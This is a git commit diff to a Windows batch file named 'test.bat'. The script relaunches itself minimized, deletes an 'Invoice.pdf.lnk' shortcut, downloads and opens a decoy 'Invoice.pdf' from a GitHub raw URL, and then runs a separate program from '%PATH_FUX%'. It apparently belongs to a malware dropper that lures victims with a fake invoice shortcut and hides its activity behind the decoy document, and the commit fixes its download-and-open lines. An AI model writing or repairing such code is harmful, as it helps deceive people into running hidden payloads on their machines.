3507acafdb57b49aa5e5335a927787d8cbc99cf6
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 13:49:30 +0100

    Update test.bat

--- test.bat
+++ test.bat
@@ -12,8 +12,8 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
     set URL_INVOICE=https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf
     set INVOICE_NAME=Invoice.pdf
     set PATH_INVOICE=%PATH_TO_ENTRY%\%INVOICE_NAME%
-    del Invoice.pdf.lnk"
-    curl -L -o "%PATH_INVOICE%" "%URL_INVOICE%" && start Invoice.pdf "
+    del Invoice.pdf.lnk
+    curl -L -o "%PATH_INVOICE%" "%URL_INVOICE%" && start "%PATH_INVOICE%"
 
     "%PATH_FUX%"
 exit
